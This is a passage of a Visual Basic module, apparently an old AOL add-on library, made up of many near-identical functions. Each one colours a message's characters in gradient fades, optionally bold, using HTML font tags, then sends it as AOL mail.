        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreenYellowGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyBlueGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyGreenGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyPurpleGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyRedGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailGreyYellowGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL3_MailBoldGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenPurpleGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenRedGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreenYellowGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyBlueGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyGreenGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyPurpleGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyRedGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL3_MailBoldGreyYellowGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL3_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackPurpleBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackedRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlackYellowBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBluePurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBluePurpleBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueRedBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBlueYellowBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBoldBlackBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackPurpleBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackedRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackRedBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldBlackYellowBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueBlackBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
